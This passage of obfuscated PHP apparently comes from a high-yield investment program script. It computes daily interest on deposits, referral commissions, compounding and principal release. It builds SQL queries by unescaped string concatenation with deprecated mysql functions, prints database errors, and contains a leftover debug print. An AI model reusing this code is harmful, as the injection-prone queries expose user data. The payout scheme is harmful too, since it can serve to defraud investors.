                  $q = 'insert into hm2_history set user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ('' . ',
                        amount = -' . $elnlczCfN . ',
                    		type=\'deposit\',
                    		description = \'Compounding deposit\',
                    		actual_amount = -' . $elnlczCfN . ',
                    		ec = ') . $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']] . ',
                    		date = \'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ',
                                deposit_id = ') . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
                  (mysql_query ($q) OR print mysql_error ());
                  $q = '' . 'update hm2_deposits set amount = amount + ' . $elnlczCfN . ',
                    		actual_amount = actual_amount + ' . $elnlczCfN . '
                    		where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
                  (mysql_query ($q) OR print mysql_error ());
                }
              }

              elnlcokeap ($elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']], $elnlcGGMmt, 'date = \'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG));
            }
          }

          $q = '' . 'update hm2_deposits set 
      	q_pays = q_pays + 1, 
      	last_pay_date = last_pay_date + interval ' . $elnlcJwrG . ' ' . $elnlcRIyyJ . ' where id =' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      $q = 'select * from hm2_types where q_days > 0';
      $elnlchGkPU = mysql_query ($q);
      while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
      {
        if ($elnlcCgqPK[$elnlcsyENS['elnlcqCEH']] == 1)
        {
          $elnlcLdJkx = floor ($elnlcCgqPK[$elnlcsyENS['elnlcJSvGA']] / 5) * 7 + $elnlcCgqPK[$elnlcsyENS['elnlcJSvGA']] % 5;
          $elnlclfKQI = $elnlcCgqPK[$elnlcsyENS['elnlcxfih']] - (0 < $elnlcCgqPK[$elnlcsyENS['elnlcxfih']] ? 1 : 0);
          $elnlcCSauH = '' . ' (' . $elnlcLdJkx . ' + ((' . $elnlcCgqPK[$elnlcsyENS['elnlcJSvGA']] . ' % 5 + WEEKDAY(deposit_date)) > 5)*2 + ' . $elnlclfKQI . ') ';
        }
        else
        {
          $elnlcLdJkx = $elnlcCgqPK[$elnlcsyENS['elnlcJSvGA']] + $elnlcCgqPK[$elnlcsyENS['elnlcxfih']] - (0 < $elnlcCgqPK[$elnlcsyENS['elnlcxfih']] ? 1 : 0);
          $elnlcCSauH = '' . ' ' . $elnlcLdJkx . ' ';
        }

        $elnlckapu = $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
        if ($elnlcCgqPK[$elnlcsyENS['elnlcRupg']] == 1)
        {
          $q = '' . 'select * from hm2_deposits where 
                type_id = ' . $elnlckapu . ' and 
                status = \'on\' and 
                user_id = ' . $elnlcTVzDu . ' and 
                (
                   deposit_date + interval ' . $elnlcCSauH . ' ' . ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcQcSG'] ? 'hour' : 'day') . ('' . ' < last_pay_date
                      or
                   deposit_date + interval ' . $elnlcCSauH . ' ') . ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcQcSG'] ? 'hour' : 'day') . ('' . ' < now()
                )
                and
                (
                   (' . $elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] . ' = 0) || (' . $elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] . ' && (deposit_date + interval ' . $elnlcCgqPK[$elnlcsyENS['elnlcOhgyp']] . ' ') . ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcQcSG'] ? 'hour' : 'day') . ' < now())))
             ';
          $elnlcjSNE = mysql_query ($q);
          while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
          {
            $q = 'insert into hm2_history set
                user_id = ' . $elnlcUpbus[$elnlcsyENS['elnlcAvUq']] . ',
      		amount = ' . $elnlcUpbus[$elnlcsyENS['elnlcAwVw']] . ',
      		type=\'release_deposit\',
      		actual_amount = ' . $elnlcUpbus[$elnlcsyENS['elnlcAwVw']] . ',
                ec = ' . $elnlcUpbus[$elnlcsyENS['elnlcyqyS']] . ',
      		date = \'' . $elnlcUpbus[$elnlcsyENS['elnlcrLdHj']] . ('' . '\' + interval ' . $elnlcLdJkx . ' ') . ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcQcSG'] ? 'hour' : 'day') . ',
                deposit_id = ' . $elnlcUpbus[$elnlcsyENS['elnlcLbvLL']];
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        $q = '' . 'update hm2_deposits set status=\'off\' where 
             user_id = ' . $elnlcTVzDu . ' and 
    	       (deposit_date + interval ' . $elnlcCSauH . ' ' . ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcQcSG'] ? 'hour' : 'day') . ('' . ' < last_pay_date
                  or
                deposit_date + interval ' . $elnlcCSauH . ' ') . ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcQcSG'] ? 'hour' : 'day') . ('' . ' < now()) and
               ((' . $elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] . ' = 0) || (' . $elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] . ' && (deposit_date + interval ' . $elnlcCgqPK[$elnlcsyENS['elnlcOhgyp']] . ' ') . ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcQcSG'] ? 'hour' : 'day') . ('' . ' < now()))) and
             type_id = ' . $elnlckapu . '
           ');
        (mysql_query ($q) OR print mysql_error ());
      }
    }

  }

  function elnlcfltmc ($elnlcHmVi)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    $elnlcWBLE = array ();
    if (($elnlcSuVc[$elnlcsyENS['elnlcmPmuG']] == 1 AND $elnlcHmVi != -2))
    {
      return null;
    }

    $q = 'select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = \'on\' and hm2_types.id = hm2_plans.parent order by parent, min_deposit';
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $elnlcWBLE[$elnlcCgqPK[$elnlcsyENS['elnlcbViuH']]][$elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']]] = $elnlcCgqPK;
    }

    $elnlclOSA = $elnlcsyENS['elnlctNxTK'];
    $elnlconLWC = 'u.last_access_time + interval 30 minute < now() ';
    if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcDxRe'])
    {
      $elnlcebNw = 't.send_profit_to_stocks,t.send_percent_to_stocks';
      $elnlcBVmI = ' t.pay_by_button = 0 and';
    }

    if ($elnlcHmVi == -1)
    {
      $elnlconLWC = '1 = 1';
      $q = 'select * from hm2_users where l_e_t + interval 15 minute < now() and status = \'on\'';
    }
    else
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcHmVi . ' and status = \'on\'';
    }

    if ($elnlcHmVi == -2)
    {
      $q = 'select * from hm2_users where status = \'on\'';
      $q = 'select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id';
    }

    ($elnlckfIs = mysql_query ($q) OR print mysql_error ());
    while ($elnlcCKDFD = mysql_fetch_array ($elnlckfIs))
    {
      $elnlcTVzDu = $elnlcCKDFD[$elnlcsyENS['elnlcLbvLL']];
      $elnlcKvqEM = fopen ('' . './tmpl_c/lock_user' . $elnlcTVzDu, 'w+');
      if (flock ($elnlcKvqEM, LOCK_EX))
      {
      }
      else
      {
        fclose ($elnlcKvqEM);
        continue;
      }

      $q = '' . 'update hm2_users set l_e_t = now() where id = ' . $elnlcTVzDu;
      (mysql_query ($q) OR print mysql_error ());
      $elnlclOSA = $elnlcsyENS['elnlctNxTK'];
      $q = 'select max(p.min_deposit) as min_deposit, p.parent as type_id from hm2_plans as p group by p.parent';
      ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
      while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
      {
        $q = '' . 'select max_deposit as max_amount from hm2_plans where parent = ' . $elnlcCgqPK[$elnlcsyENS['elnlcPfzD']] . ' and min_deposit = ' . $elnlcCgqPK[$elnlcsyENS['elnlcwFTQ']];
        ($elnlcSrlye = mysql_query ($q) OR print mysql_error ());
        while ($elnlcggjo = mysql_fetch_array ($elnlcSrlye))
        {
          $elnlcMakuI[$elnlcCgqPK[$elnlcsyENS['elnlcPfzD']]] = $elnlcggjo[$elnlcsyENS['elnlcxULH']];
        }
      }

      while (0 < $elnlclOSA)
      {
        $q = '' . 'select 
              d.*, 
              t.period as period, t.use_compound as use_compound,
              t.compound_min_deposit, t.compound_max_deposit,
              t.compound_min_percent, t.compound_max_percent,
              t.compound_percents_type, t.compound_percents,
/*              t.rpcp as rpcp,*/
              t.work_week as work_week,
              t.q_days as q_days, t.withdraw_principal,
              t.delay as delay,
              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,
              ' . $elnlcebNw . '
              t.return_profit as return_profit,
              t.return_profit_percent as return_profit_percent
            from
              hm2_deposits as d,
              hm2_types as t,
              hm2_users as u
            where 
              u.id = ' . $elnlcTVzDu . ' and 
              u.status = \'on\' and 
              d.status=\'on\' and 
              d.type_id = t.id and 
              t.status = \'on\' and 
              u.id = d.user_id and
              ' . $elnlcBVmI . '
              (((t.q_days + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / if(t.period = \'h\', 60*60, 60*60*24))) or t.q_days = 0) and 
              (
                (d.last_pay_date + interval 1 hour <= now() and t.period = \'h\')or
                (d.last_pay_date + interval 1 day <= now() and t.period = \'d\')or
                (d.last_pay_date + interval 7 day <= now() and t.period = \'w\') or
                (d.last_pay_date + interval 14 day <= now() and t.period = \'b-w\') or
                (d.last_pay_date + interval 1 month <= now() and t.period = \'m\') or
                (d.last_pay_date + interval 2 month <= now() and t.period = \'2m\') or
                (d.last_pay_date + interval 3 month <= now() and t.period = \'3m\') or
                (d.last_pay_date + interval 6 month <= now() and t.period = \'6m\') or
                (d.last_pay_date + interval 1 year <= now() and t.period = \'y\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day <= now() and t.period = \'end\') 
              ) and
              ((t.q_days = 0) or 
                (               
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) hour >= d.last_pay_date and t.period = \'h\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date and t.period = \'d\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = \'w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = \'b-w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = \'m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = \'2m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = \'3m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = \'6m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = \'y\') or
                (t.q_days > 0 and t.period = \'end\') 
              ))';
        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
        $elnlclOSA = $elnlcsyENS['elnlcmjUx'];
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          ++$elnlclOSA;
          if (!isset ($elnlcWBLE[$elnlcCgqPK[$elnlcsyENS['elnlcPfzD']]]))
          {
            continue;
          }

          $elnlcTjnV = $elnlcsyENS['elnlcmjUx'];
          $elnlcyvqy = $elnlcsyENS['elnlcmjUx'];
          reset ($elnlcWBLE);
          reset ($elnlcWBLE[$elnlcCgqPK[$elnlcsyENS['elnlcPfzD']]]);
          while (list ($elnlcxHGyw, $elnlcRdog) = each ($elnlcWBLE[$elnlcCgqPK[$elnlcsyENS['elnlcPfzD']]]))
          {
            if (($elnlcRdog[$elnlcsyENS['elnlcwFTQ']] <= $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] AND ($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] <= $elnlcRdog[$elnlcsyENS['elnlcMFyGk']] OR $elnlcRdog[$elnlcsyENS['elnlcMFyGk']] == 0)))
            {
              $elnlcTjnV = $elnlcRdog[$elnlcsyENS['elnlcOhvjC']];
            }

            if (($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] < $elnlcRdog[$elnlcsyENS['elnlcwFTQ']] AND $elnlcTjnV == 0))
            {
              $elnlcTjnV = $elnlcyvqy;
            }

            if (($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] < $elnlcRdog[$elnlcsyENS['elnlcwFTQ']] AND 0 < $elnlcTjnV))
            {
              break;
            }

            $elnlcyvqy = $elnlcRdog[$elnlcsyENS['elnlcOhvjC']];
          }

          if (($elnlcRdog[$elnlcsyENS['elnlcMFyGk']] != 0 AND $elnlcRdog[$elnlcsyENS['elnlcMFyGk']] < $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']]))
          {
            $elnlcTjnV = $elnlcyvqy;
          }

          $elnlcGGMmt = $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] * $elnlcTjnV / 100;
          $elnlcJwrG = '';
          if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcaeKEf'])
          {
            $elnlcJwrG = ' 1 day ';
          }
          else
          {
            if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcQcSG'])
            {
              $elnlcJwrG = ' 1 hour ';
            }
            else
            {
              if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcwGlL'])
              {
                $elnlcJwrG = ' 7 day ';
              }
              else
              {
                if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == 'b-w')
                {
                  $elnlcJwrG = ' 14 day ';
                }
                else
                {
                  if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcGPcC'])
                  {
                    $elnlcJwrG = ' 1 month ';
                  }
                  else
                  {
                    if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlczdyU'])
                    {
                      $elnlcJwrG = ' 2 month ';
                    }
                    else
                    {
                      if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlczdOP'])
                      {
                        $elnlcJwrG = ' 3 month ';
                      }
                      else
                      {
                        if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcwbAEV'])
                        {
                          $elnlcJwrG = ' 6 month ';
                        }
                        else
                        {
                          if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcclPO'])
                          {
                            $elnlcJwrG = ' 1 year ';
                          }
                          else
                          {
                            if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcBEDou'])
                            {
                              $elnlcJwrG = ' ' . $elnlcCgqPK[$elnlcsyENS['elnlcJSvGA']] . ' day ';
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }

          if (($elnlcTjnV == 0 AND $elnlcJwrG == ''))
          {
            continue;
          }

          $elnlcOWWAf = -1;
          $q = 'select weekday(\'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ') as dw');
          ($elnlcSrlye = mysql_query ($q) OR print mysql_error ());
          while ($elnlcggjo = mysql_fetch_array ($elnlcSrlye))
          {
            $elnlcOWWAf = $elnlcggjo[$elnlcsyENS['elnlccblu']];
          }

          $q = 'select count(id) as `col` from hm2_history where 
		type = \'earning\' and ' . ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcQcSG'] ? ' date_format(date, \'%Y-%m-%d  %H\') = date_format(\'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ', \'%Y-%m-%d  %H\') and') : 'to_days(date) = to_days(\'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ') and ')) . ' deposit_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
          ($elnlcqTHnf = mysql_query ($q) OR print mysql_error ());
          $elnlciliCo = $elnlcsyENS['elnlcmjUx'];
          while ($elnlcngDEl = mysql_fetch_array ($elnlcqTHnf))
          {
            $elnlciliCo = $elnlcngDEl[$elnlcsyENS['elnlckNCf']];
          }

          if ($elnlciliCo == 0)
          {
            if ((5 <= $elnlcOWWAf AND $elnlcCgqPK[$elnlcsyENS['elnlcqCEH']] == 1))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ',
                    amount = 0,
                    type = \'earning\',
                    description = \'No interest on ' . ($elnlcOWWAf == 5 ? 'Saturday' : 'Sunday') . '\',
                    actual_amount = 0,
                    date = \'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ',
                    ec = ') . $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
              (mysql_query ($q) OR print mysql_error ());
            }
            else
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ('' . ',
                    amount = ' . $elnlcGGMmt . ',
                    type = \'earning\',
                    description = \'Earning from deposit ') . $elnlcSuVc[$elnlcsyENS['elnlcypSu']] . number_format ($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']], 2) . ('' . ' - ' . $elnlcTjnV . ' %\',
                    actual_amount = ' . $elnlcGGMmt . ',
                    date = \'') . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ',
                    ec = ') . $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
              (mysql_query ($q) OR print mysql_error ());
              if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcOQeK'])
              {
                if ((0 < $elnlcCKDFD[$elnlcsyENS['elnlckGUEd']] AND 0 < $elnlcSuVc[$elnlcsyENS['elnlcwKFVp']]))
                {
                  $elnlckrBD = $elnlcGGMmt * $elnlcSuVc[$elnlcsyENS['elnlcwKFVp']] / 100;
                  $elnlcCFrLE = elnlcnczen ($elnlcCKDFD[$elnlcsyENS['elnlczWew']]);
                  if ($elnlcSuVc[$elnlcsyENS['elnlcojBh']] <= $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']])
                  {
                    $q = '' . 'select max(actual_amount) as maxam from hm2_deposits where user_id = ' . $elnlcCKDFD[$elnlcsyENS['elnlckGUEd']] . ' and status = \'on\'';
                    ($elnlcSrlye = mysql_query ($q) OR print mysql_error ());
                    $elnlcHKrA = $elnlcsyENS['elnlcmjUx'];
                    while ($elnlcggjo = mysql_fetch_array ($elnlcSrlye))
                    {
                      $elnlcHKrA = $elnlcggjo[$elnlcsyENS['elnlcOnMHn']];
                    }

                    if ($elnlcSuVc[$elnlcsyENS['elnlcpKBS']] <= $elnlcHKrA)
                    {
                      $q = '' . 'insert into hm2_history set user_id = ' . $elnlcCKDFD[$elnlcsyENS['elnlckGUEd']] . ',
			amount = ' . $elnlckrBD . ',
			type = \'commissions\',
			description = \'Daily referral earning from user ' . $elnlcCFrLE . '\',
			actual_amount = ' . $elnlckrBD . ',
			date = \'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ',
                        ec = ' . $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']] . ',
			str = \'gg\'');
                      (mysql_query ($q) OR print mysql_error ());
                    }
                  }
                }
              }

              if (($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcDxRe'] AND $elnlcCgqPK[$elnlcsyENS['elnlcUiJxV']]))
              {
                $elnlcxoGrw = floor ($elnlcGGMmt * $elnlcCgqPK[$elnlcsyENS['elnlcoUDj']]) / 100;
                if (0 < $elnlcxoGrw)
                {
                  $q = 'insert into hm2_history set user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ('' . ',
                      amount = -' . $elnlcxoGrw . ',
                      type = \'penality\',
                      description = \'Earning moved to Stocks account\',
                      actual_amount = -' . $elnlcxoGrw . ',
                      date = \'') . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ',
                      ec = ') . $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']] . ',
                      str = \'gg\',
                      deposit_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
                  (mysql_query ($q) OR print mysql_error ());
                  $q = 'insert into sh2_history set user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ('' . ',
                      amount = ' . $elnlcxoGrw . ',
                      type = \'bonus\',
                      description = \'Earning received to buy shares\',
                      actual_amount = ' . $elnlcxoGrw . ',
                      date = \'') . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ',
                      ec = ') . $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']] . ',
                      str = \'gg\'';
                  (mysql_query ($q) OR print mysql_error ());
                }
              }
            }
          }

          $elnlcRIyyJ = '';
          if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcBEDou'])
          {
            if (($elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] == 0 OR ($elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] AND $elnlcCgqPK[$elnlcsyENS['elnlccNEL']])))
            {
              $elnlcRIyyJ = ', status = \'off\'';
            }

            if (($elnlcCgqPK[$elnlcsyENS['elnlcRupg']] == 1 AND ($elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] == 0 OR ($elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] AND $elnlcCgqPK[$elnlcsyENS['elnlccNEL']]))))
            {
              $elnlcDBLq = $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']];
              $q = 'insert into hm2_history set user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ',
                    amount = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] . ',
                    type=\'release_deposit\',
                    actual_amount = ' . $elnlcDBLq . ',
                    ec = ' . $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']] . ('' . ',
                    date = \'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . '\' + interval ' . $elnlcJwrG . ',
                    deposit_id = ') . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']] . ',
                    description = \'Deposit release\'';
              (mysql_query ($q) OR print mysql_error ());
              if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcEuerH'])
              {
                if (0 < $elnlcCgqPK[$elnlcsyENS['elnlccdExO']])
                {
                  $q = '' . 'select sum(actual_amount) as amt from hm2_history where deposit_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']] . ' and type = \'earning\' and user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']];
                  print $q;
                  ($elnlcxUGG = mysql_query ($q) OR print mysql_error ());
                  $elnlcveMx = $elnlcsyENS['elnlcmjUx'];
                  while ($elnlcimQA = mysql_fetch_array ($elnlcxUGG))
                  {
                    $elnlcveMx = $elnlcimQA[$elnlcsyENS['elnlcReqR']];
                  }

                  $elnlcsIlP = ($elnlcDBLq + $elnlcveMx) * $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] / 100;
                  $elnlclfKQI = intval ($elnlcCgqPK[$elnlcsyENS['elnlcxfih']]);
                  $q = '' . 'insert into hm2_deposits set 
		           user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ',
		           type_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcPfzD']] . ',
		           deposit_date = \'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . '\' + interval ' . $elnlcJwrG . ',
		           last_pay_date = (\'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . '\' + interval ' . $elnlcJwrG . ') + interval ' . $elnlclfKQI . ' day,
		           status = \'on\',
		           amount = ' . $elnlcsIlP . ',
		           actual_amount = ' . $elnlcsIlP . ',
		           compound = 0,
		           ec = ' . $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']] . '    ';
                  (mysql_query ($q) OR print mysql_error ());
                  $elnlcOMIk = mysql_insert_id ();
                  $q = '' . 'insert into hm2_history set 
		           user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ',
		           amount = -' . $elnlcsIlP . ',
		           actual_amount = -' . $elnlcsIlP . ',
		           type=\'deposit\',
		           date = \'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . '\' + interval ' . $elnlcJwrG . ',
		           description = \'Deposit (reinvest)\',
		           ec = ' . $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']] . ',
		           deposit_id = ' . $elnlcOMIk . '    ';
                  (mysql_query ($q) OR print mysql_error ());
                }
              }
            }
          }
          else
          {
            if ((5 <= $elnlcOWWAf AND $elnlcCgqPK[$elnlcsyENS['elnlcqCEH']] == 1))
            {
            }
            else
            {
              if (((0 < $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] AND $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] <= 100) AND $elnlcCgqPK[$elnlcsyENS['elnlcvNkQ']] == 1))
              {
                if ($elnlcCgqPK[$elnlcsyENS['elnlcdzAd']] == 0)
                {
                  $elnlcCgqPK[$elnlcsyENS['elnlcdzAd']] = $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] + 1;
                }

                if (($elnlcCgqPK[$elnlcsyENS['elnlcqQISr']] <= $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] AND $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] <= $elnlcCgqPK[$elnlcsyENS['elnlcdzAd']]))
                {
                  if ($elnlcCgqPK[$elnlcsyENS['elnlcDxJb']] == 1)
                  {
                    $elnlcnGUUn = preg_split ('/\\s*,\\s*/', $elnlcCgqPK[$elnlcsyENS['elnlcDexfh']]);
                    if (!in_array ($elnlcCgqPK[$elnlcsyENS['elnlccdExO']], $elnlcnGUUn))
                    {
                      $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] = $elnlcnGUUn[0];
                    }
                  }
                  else
                  {
                    if ($elnlcCgqPK[$elnlcsyENS['elnlccdExO']] < $elnlcCgqPK[$elnlcsyENS['elnlcORJuw']])
                    {
                      $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] = $elnlcCgqPK[$elnlcsyENS['elnlcORJuw']];
                    }

                    if ($elnlcCgqPK[$elnlcsyENS['elnlcyDBs']] < $elnlcCgqPK[$elnlcsyENS['elnlccdExO']])
                    {
                      $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] = $elnlcCgqPK[$elnlcsyENS['elnlcyDBs']];
                    }
                  }
                }
                else
                {
                  $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] = $elnlcsyENS['elnlcmjUx'];
                }

                if ((0 < $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] AND $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] <= 100))
                {
                  $elnlczCfN = $elnlcGGMmt * $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] / 100;
                  $elnlcGGMmt = floor ((floor ($elnlcGGMmt * 100000) / 100000 - floor ($elnlczCfN * 100000) / 100000) * 100) / 100;
                  if (($elnlcMakuI[$elnlcCgqPK[$elnlcsyENS['elnlcPfzD']]] == 0 OR $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] + $elnlczCfN < $elnlcMakuI[$elnlcCgqPK[$elnlcsyENS['elnlcPfzD']]]))
                  {
                    $q = 'insert into hm2_history set user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ('' . ',
                        amount = -' . $elnlczCfN . ',
                    		type=\'deposit\',
                    		description = \'Compounding deposit\',
                    		actual_amount = -' . $elnlczCfN . ',
                    		ec = ') . $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']] . ',
                    		date = \'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ',
                                deposit_id = ') . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
                    (mysql_query ($q) OR print mysql_error ());
                    $q = '' . 'update hm2_deposits set amount = amount + ' . $elnlczCfN . ',
                    		actual_amount = actual_amount + ' . $elnlczCfN . '
                    		where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
                    (mysql_query ($q) OR print mysql_error ());
                  }
                }
              }

